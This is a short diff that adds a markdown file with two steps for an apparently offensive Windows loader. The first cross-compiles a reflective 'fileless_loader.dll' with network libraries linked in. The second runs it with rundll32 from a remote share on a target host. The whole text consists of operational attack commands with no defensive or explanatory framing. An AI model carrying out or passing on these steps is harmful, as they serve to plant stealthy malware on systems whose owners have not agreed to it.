@@ -1,0 +1,7 @@
+## compile 
+
+x86_64-w64-mingw32-gcc -shared -o fileless_loader.dll ReflectiveDLLMain.c -lwininet -luser32
+
+## deploy 
+
+rundll32 \\target\printdlls\fileless_loader.dll,EntryPoint
